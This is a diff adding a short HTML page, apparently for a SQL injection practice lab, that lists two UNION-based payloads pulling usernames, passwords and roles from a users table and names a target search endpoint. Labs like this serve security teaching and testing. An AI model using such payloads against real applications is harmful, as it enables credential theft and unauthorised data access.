@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>SQLi Payloads - Union-like</title>
+</head>
+<body>
+  <h1>Union-like Payloads</h1>
+  <ul>
+    <li><code>1 UNION SELECT id, username, password FROM users</code></li>
+    <li><code>0 UNION SELECT 999, role, password FROM users</code></li>
+  </ul>
+  <p>Endpoint target: <code>/union-like/search?id=...</code></p>
+</body>
+</html>
